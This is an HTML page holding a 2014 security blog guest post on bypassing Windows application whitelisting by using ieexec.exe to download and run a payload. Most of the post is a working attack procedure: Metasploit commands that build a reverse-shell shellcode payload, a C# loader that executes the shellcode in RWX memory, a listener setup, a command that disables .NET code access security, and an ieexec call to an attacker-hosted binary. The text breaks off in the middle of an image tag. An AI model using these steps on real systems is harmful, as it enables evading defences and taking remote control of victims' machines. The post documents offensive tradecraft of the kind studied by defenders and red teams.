@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Application Whitelist Bypass using IEexec.exe - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Application Whitelist Bypass using IEexec.exe" />
+<meta property="og:description" content="Guest post by @subTee There was a recent presentation at DerbyCon, entitled:
+Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation by Christopher Campbell &amp; Matthew Graeber
+I highly recommend that you start with this presentation as it lays the foundation for this post.
+The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2014-01-16T11:30:44-05:00" />
+<meta property="article:modified_time" content="2014-01-16T11:30:44-05:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Application Whitelist Bypass using IEexec.exe"/>
+<meta name="twitter:description" content="Guest post by @subTee There was a recent presentation at DerbyCon, entitled:
+Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation by Christopher Campbell &amp; Matthew Graeber
+I highly recommend that you start with this presentation as it lays the foundation for this post.
+The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" /><link rel="prev" href="https://malicious.link/posts/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/" /><link rel="next" href="https://malicious.link/posts/2014/2014-01-18-attacker-ghost-stories-shmoocon-2014/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Application Whitelist Bypass using IEexec.exe",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2014\/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe\/"
+        },"genre": "posts","keywords": "whitelisting, ieexec","wordcount":  930 ,
+        "url": "https:\/\/malicious.link\/posts\/2014\/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe\/","datePublished": "2014-01-16T11:30:44-05:00","dateModified": "2014-01-16T11:30:44-05:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "subTee"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Application Whitelist Bypass using IEexec.exe</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>subTee</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2014-01-16">2014-01-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;930 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#guest-post-by-subteehttpstwittercomsubtee">Guest post by <a href="https://twitter.com/subTee">@subTee</a></a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="guest-post-by-subteehttpstwittercomsubtee">Guest post by <a href="https://twitter.com/subTee" target="_blank" rel="noopener noreffer ">@subTee</a></h2>
+<p>There was a recent presentation at DerbyCon, entitled:</p>
+<p><a href="http://www.youtube.com/watch?v=j-r6UonEkUw" target="_blank" rel="noopener noreffer ">Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation</a>
+by Christopher Campbell &amp; Matthew Graeber</p>
+<p>I highly recommend that you start with this presentation as it lays the foundation for this post.</p>
+<p>The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.</p>
+<p>It is only a matter of time before time before you might encounter an Application Whitelisting Defense.</p>
+<p>As a follow up to that presentation, I began exploring the binaries that ship by default with Windows.  That is where I stumbled across a binary in the <code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727</code> path.</p>
+<p>The Executable is ieexec.exe. A write up is here: <a href="http://support.microsoft.com/kb/822485" target="_blank" rel="noopener noreffer ">http://support.microsoft.com/kb/822485</a></p>
+<blockquote>
+<p>“The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.”</p>
+</blockquote>
+<p>Excellent! So, now we just need to host our malicious binary , and call it from ieexec.exe.</p>
+<p>This is great, since most Application Whitelisting Environments are going to “Trust” anything signed my Microsoft as a matter of convenience. IEexec.exe will download and execute our code for us, all under the trusted process.</p>
+<p>So lets get started!</p>
+<p><strong>Step 1.</strong> Prepare your Shellcode, or whatever malicious app you want. I compiled my executable using SharpDevelop, since it has less footprint than a full blown Visual Studio install.
+From msfconsole:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf &gt; use windows/x64/shell/reverse_tcp
+</span></span><span class="line"><span class="cl">msf payload(reverse_tcp) &gt; set LHOST x.x.x.x
+</span></span><span class="line"><span class="cl">msf payload(reverse_tcp) &gt; set LPORT 443
+</span></span><span class="line"><span class="cl">msf payload(reverse_tcp) &gt; generate -t csharp
+</span></span><span class="line"><span class="cl">￼
+</span></span><span class="line"><span class="cl">byte[] buf = new byte[422] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> &lt;Snipped Full ShellCode for Brevity&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2.</strong> Create the .NET wrapper application</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">native</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">private</span> <span class="kd">static</span> <span class="n">UInt32</span> <span class="n">MEM_COMMIT</span> <span class="p">=</span> <span class="m">0x1000</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">private</span> <span class="kd">static</span> <span class="n">UInt32</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">=</span> <span class="m">0x40</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">private</span> <span class="kd">static</span> <span class="n">UInt32</span> <span class="n">MEM_RELEASE</span> <span class="p">=</span> <span class="m">0x8000</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="c1">// native function&#39;s compiled code </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="p">[]</span> <span class="n">proc</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[]</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">                <span class="m">0xfc</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0xe4</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x52</span><span class="p">...</span> 
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">//Edited ShellCode For Brevity </span>
+</span></span><span class="line"><span class="cl">            <span class="p">};</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">UInt32</span> <span class="n">funcAddr</span> <span class="p">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="p">(</span><span class="n">UInt32</span><span class="p">)</span><span class="n">proc</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">Marshal</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)(</span><span class="n">funcAddr</span><span class="p">),</span> <span class="n">proc</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">IntPtr</span> <span class="n">hThread</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">UInt32</span> <span class="n">threadId</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">// prepare data </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">PROCESSOR_INFO</span> <span class="n">info</span> <span class="p">=</span> <span class="k">new</span> <span class="n">PROCESSOR_INFO</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">IntPtr</span> <span class="n">pinfo</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="n">Marshal</span><span class="p">.</span><span class="n">SizeOf</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">PROCESSOR_INFO</span><span class="p">)));</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">Marshal</span><span class="p">.</span><span class="n">StructureToPtr</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">pinfo</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// execute native code </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">hThread</span> <span class="p">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">funcAddr</span><span class="p">,</span> <span class="n">pinfo</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">ref</span> <span class="n">threadId</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="m">0xFFFFFFFF</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">// retrive data </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">info</span> <span class="p">=</span> <span class="p">(</span><span class="n">PROCESSOR_INFO</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="n">PtrToStructure</span><span class="p">(</span><span class="n">pinfo</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">PROCESSOR_INFO</span><span class="p">));</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">Marshal</span><span class="p">.</span><span class="n">FreeHGlobal</span><span class="p">(</span><span class="n">pinfo</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">VirtualFree</span><span class="p">((</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">funcAddr</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">UInt32</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">UInt32</span> <span class="n">lpStartAddr</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">size</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flProtect</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="kt">bool</span> <span class="n">VirtualFree</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwFreeType</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">IntPtr</span> <span class="n">CreateThread</span><span class="p">(</span> <span class="n">UInt32</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">param</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="k">ref</span> <span class="n">UInt32</span> <span class="n">lpThreadId</span> <span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="kt">bool</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">handle</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">UInt32</span> <span class="n">WaitForSingleObject</span><span class="p">(</span> <span class="n">IntPtr</span> <span class="n">hHandle</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwMilliseconds</span> <span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">IntPtr</span> <span class="n">GetModuleHandle</span><span class="p">(</span> <span class="kt">string</span> <span class="n">moduleName</span> <span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">UInt32</span> <span class="n">GetProcAddress</span><span class="p">(</span> <span class="n">IntPtr</span> <span class="n">hModule</span><span class="p">,</span> <span class="kt">string</span> <span class="n">procName</span> <span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">UInt32</span> <span class="n">LoadLibrary</span><span class="p">(</span> <span class="kt">string</span> <span class="n">lpFileName</span> <span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">UInt32</span> <span class="n">GetLastError</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="na">        
+</span></span></span><span class="line"><span class="cl"><span class="na">        [StructLayout(LayoutKind.Sequential)]</span> 
+</span></span><span class="line"><span class="cl">        <span class="kd">internal</span> <span class="k">struct</span> <span class="nc">PROCESSOR_INFO</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">UInt32</span> <span class="n">dwMax</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">UInt32</span> <span class="n">id0</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">UInt32</span> <span class="n">id1</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">UInt32</span> <span class="n">id2</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">UInt32</span> <span class="n">dwStandard</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">UInt32</span> <span class="n">dwFeature</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">// if AMD </span>
+</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">UInt32</span> <span class="n">dwExt</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.</p>
+<p><strong>Step 3.</strong> Host the Exe. For this example, I used Mongoose. Simple and Effective:</p>
+<p><a href="http://code.google.com/p/mongoose/" target="_blank" rel="noopener noreffer ">http://code.google.com/p/mongoose/</a></p>
+<p>By default Mongoose listens on port 8080. This is configurable. Simple place your compiled binary from step 2 into the same directory as Mongoose. Start Mongoose and you are almost ready to deliver your payload.</p>
+<p><strong>Step 4.</strong> Setup your receiver:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf payload(reverse_tcp) &gt; use exploit/multi/handler
+</span></span><span class="line"><span class="cl">msf exploit(handler) &gt; set LHOST x.x.x.x
+</span></span><span class="line"><span class="cl">msf exploit(handler) &gt; set LPORT 443
+</span></span><span class="line"><span class="cl">msf exploit(handler) &gt; set PAYLOAD windows/x64/shell/reverse_tcp
+</span></span><span class="line"><span class="cl">msf exploit(handler) &gt; exploit -j
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 5.</strong> From the host that is protected via Whitelisting. Open 2 Command Prompts as administrator.</p>
+<p><strong>CMD 1 Execute:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>￼
+<strong>CMD 2 Execute:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;ieexec.exe http://x.x.x.x:8080/bypass.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is some detail to unpack here, I can go over later, as to why we need to run caspol.exe. Here’s the behavior I saw in our experimentation with this.</p>
+<p>Initial attempt to run our rogue binary fails, since it is unknown/untrusted/unapproved:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/2014/201401_whitelisting_1.png"
+        data-srcset="/images/2014/201401_whitelisting_1.png, /images/2014/201401_whitelisting_1.png 1.5x, /images/2014/201401_whitelisting_1.png 2x"
